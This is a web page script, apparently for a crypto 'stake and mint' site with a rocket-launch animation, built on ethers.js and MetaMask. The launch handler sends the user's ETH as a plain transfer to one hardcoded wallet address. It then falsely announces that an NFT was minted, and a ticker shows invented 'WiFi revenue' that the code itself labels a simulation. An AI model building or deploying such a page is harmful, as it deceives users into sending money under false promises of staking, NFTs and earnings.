<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>

<script>
    // 1. GLOBAL SETTINGS
    // Checksummed address to fix your "bad address checksum" error
    const RECIPIENT = '0x02F949281A8c9837963C82813589B845C5194Cbb'; 
    let provider, signer, account;
    let totalRevenue = 0;

    // 2. INITIALIZE BACKGROUND (Your existing Starfield)
    const canvas = document.getElementById('bgCanvas');
    const ctx = canvas.getContext('2d');
    function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
    window.addEventListener('resize', resizeCanvas);
    resizeCanvas();
    
    const stars = [];
    for (let i = 0; i < 400; i++) stars.push({
        x: Math.random() * canvas.width, 
        y: Math.random() * canvas.height, 
        size: Math.random() * 2 + 0.5, 
        speed: Math.random() * 0.4 + 0.1
    });

    function animateBg() {
        ctx.fillStyle = 'rgba(10,0,20,0.07)'; 
        ctx.fillRect(0,0,canvas.width,canvas.height);
        ctx.fillStyle = '#ffffff';
        stars.forEach(s => {
            ctx.globalAlpha = 0.7 + Math.sin(Date.now()*0.001 + s.x)*0.3;
            ctx.beginPath(); ctx.arc(s.x,s.y,s.size,0,Math.PI*2); ctx.fill();
            s.y += s.speed; if (s.y > canvas.height) s.y = 0;
        });
        requestAnimationFrame(animateBg);
    }
    animateBg();

    // 3. CORE WALLET LOGIC
    const connectBtn = document.getElementById('connect');
    const walletInfo = document.getElementById('wallet-info');
    const launchBtn = document.getElementById('launch');
    const statusDiv = document.getElementById('status');

    connectBtn.onclick = async () => {
        if (!window.ethereum) {
            statusDiv.innerHTML = '<span class="fail">MetaMask Browser Required</span>';
            return;
        }
        try {
            // Initialize Provider/Signer immediately to prevent 'undefined' errors
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();
            account = await signer.getAddress();
            
            walletInfo.innerHTML = `üì° Connected: ${account.slice(0,6)}...${account.slice(-4)}`;
            connectBtn.textContent = 'LINKED';
            connectBtn.classList.replace('btn-info', 'btn-success');
            launchBtn.disabled = false;
            
            // Start the WiFi Revenue Simulation
            startRevenueTicker();
        } catch (e) {
            statusDiv.innerHTML = `<span class="fail">Connection Error: ${e.message}</span>`;
        }
    };

    // 4. THE LAUNCH (STAKE & MINT)
    launchBtn.onclick = async () => {
        const fuelInput = document.getElementById('fuel');
        const rocket = document.getElementById('rocket');
        const amt = fuelInput.value;

        if (!amt || amt < 0.001) {
            statusDiv.innerHTML = '<span style="color:#ffcc00">Fuel must be at least 0.001 ETH</span>';
            return;
        }

        try {
            statusDiv.innerHTML = '<span style="color:#00f8ff">üõ∞Ô∏è Authorizing Fuel Transfer...</span>';
            launchBtn.disabled = true;

            // Step 1: Send Transaction (Direct Stake)
            const tx = await signer.sendTransaction({
                to: RECIPIENT,
                value: ethers.utils.parseEther(amt.toString())
            });

            // Step 2: Trigger Visual Launch & WiFi Logic
            statusDiv.innerHTML = '<span style="color:#00ff88">üöÄ IGNITION! Syncing WiFi Nodes...</span>';
            rocket.style.display = 'block';
            rocket.classList.add('launching');

            // Step 3: Wait for On-chain verification
            const receipt = await tx.wait();

            statusDiv.innerHTML = `
                <span class="success">MISSION COMPLETE!</span><br>
                <small style="font-size: 0.8rem;">NFT Minted in Block: ${receipt.blockNumber}</small>
            `;
            
        } catch (e) {
            statusDiv.innerHTML = `<span class="fail">Mission Aborted: ${e.message}</span>`;
            rocket.style.display = 'none';
            launchBtn.disabled = false;
        }
    };

    // 5. REVENUE SIMULATION
    function startRevenueTicker() {
        // This simulates the "WiFi Data" generating revenue on your dashboard
        setInterval(() => {
            if (account) {
                totalRevenue += Math.random() * 0.08;
                // If you add a revenue span with id="rev-display", this will update it
                const revDisplay = document.getElementById('rev-display');
                if (revDisplay) revDisplay.innerText = "$" + totalRevenue.toFixed(2);
            }
        }, 2000);
    }
</script>
